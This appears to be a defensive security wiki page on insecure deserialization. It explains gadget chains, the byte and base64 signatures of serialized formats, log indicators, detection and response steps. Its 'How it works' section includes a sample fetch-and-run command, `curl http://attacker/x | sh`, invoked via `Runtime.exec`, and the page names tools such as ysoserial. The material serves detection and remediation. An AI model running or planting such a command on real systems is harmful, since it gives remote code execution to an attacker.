<sub>[Home](../README.md) › [Web attacks](README.md)</sub>

# Insecure deserialization

> **In one line:** The application turns attacker-supplied data back into **program objects**, and a crafted object makes the server **run the attacker's code** while it's being rebuilt.

| **OWASP** | A08:2025 Software or Data Integrity Failures · CWE-502 |
|---|---|
| **MITRE ATT&CK** | [T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) |
| **Common in** | Java, .NET, PHP, Python (`pickle`), Ruby apps |
| **Tools** | ysoserial (Java), ysoserial.net (.NET), PHPGGC |

## Background

**Serialization** = turning an object in memory into bytes or text to store or send (a cookie, a cache entry, a message). **Deserialization** = turning it back into an object. Some formats let the data **choose which classes are created** and call their methods during that process.

## How it works

1. The app sends serialized data to the client, e.g. a cookie or a hidden form field containing a Java object or a .NET `ViewState`.
2. The attacker replaces it with a **"gadget chain"** built with ysoserial: a sequence of existing library classes that, when rebuilt, end up calling something like `Runtime.exec("curl http://attacker/x | sh")`.
3. The server deserializes it **before** checking anything. The command runs.
4. Result: **remote code execution**, usually as the web server account.

Real examples: Apache Commons Collections gadget chains (Java, 2015 onward), many Java app servers, .NET ViewState abuse when machine keys leak.

## Recognising serialized data

| Platform | Looks like |
|---|---|
| Java | Bytes start with `AC ED 00 05`; in base64 starts with **`rO0AB`** |
| .NET `BinaryFormatter` | base64 starting with **`AAEAAAD/////`** |
| .NET ViewState | `__VIEWSTATE=` form field, base64 |
| PHP | Text like `O:8:"UserInfo":2:{s:4:"name";...}` |
| Python pickle | base64 often starting with `gASV` (protocol 4) |

## What you see in logs

| Log source | What to look for |
|---|---|
| WAF / app logs | Cookies, parameters or bodies containing `rO0AB`, `AAEAAAD/////`, PHP `O:` objects, unusually large `__VIEWSTATE` |
| App logs | Deserialization exceptions, `ClassNotFoundException`, `InvalidClassException` (attacker probing gadget chains) |
| **EDR / Sysmon 1** | Web server process (`java`, `w3wp.exe`, `php-fpm`) spawning `cmd`, `powershell`, `sh`, `curl` |
| Network | The server connecting out to an attacker IP right after the request |

## How to detect it

The request is hard to judge on its own; the **server's behaviour afterwards** is the reliable signal: a web server spawning shells. See [Command injection](command-injection.md) for that search.

## How to respond

1. Treat as **remote code execution**: isolate the server, review commands run, hunt for [web shells](file-upload-web-shell.md) and persistence.
2. Identify the vulnerable library / endpoint and patch it.
3. If .NET machine keys or similar secrets leaked, **rotate them**.
4. **Fix:** never deserialize untrusted data with native formats; use JSON with strict schemas; sign and verify serialized data (HMAC); allowlist classes; keep libraries updated.

## References

- [OWASP: Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

---

| [← XML external entity (XXE)](xxe.md) | [Home](../README.md) | [Cross-site request forgery (CSRF) →](csrf.md) |
|:---|:---:|---:|
